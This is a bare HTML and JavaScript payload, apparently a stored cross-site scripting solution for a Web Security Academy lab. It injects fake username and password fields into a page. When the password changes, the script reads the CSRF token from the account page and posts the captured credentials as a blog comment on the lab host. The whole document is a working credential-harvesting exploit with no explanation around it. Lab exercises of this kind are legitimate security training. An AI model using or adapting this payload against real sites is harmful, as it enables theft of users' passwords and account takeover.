<input type="username" id="usernameInput" name="username"></input>
<input type="password" id="passwordInput" name="password" onchange="getCSRFToken()"></input>

<script>
function getCSRFToken(){
    var xhr = new XMLHttpRequest();
    var re = new RegExp('name="csrf" value="(.*)">');
    xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
                var csrfToken = xhr.responseText.match(re)[1];
                console.log(csrfToken)
                commentCredentials(csrfToken);
        }
    }
    xhr.open('GET', 'https://ac2c1ffa1ef0678ac0d474a900710008.web-security-academy.net/my-account', true);
    xhr.send(null);
}

function commentCredentials(csrfToken){
    var http = new XMLHttpRequest();
    var username = document.getElementById('usernameInput').value;
    var password = document.getElementById('passwordInput').value;
    var credentials = username+':'+password;
    var params = 'csrf='+csrfToken+'&postId=2&comment='+credentials+'&name=VICTIM&email=victim@victim.com&website=https%3A%2F%2Fweb-security-academy.net%2Fpost%3FpostId%3D2'
    http.open('POST', 'https://ac2c1ffa1ef0678ac0d474a900710008.web-security-academy.net/post/comment', true);
    http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    http.send(params);
}
</script>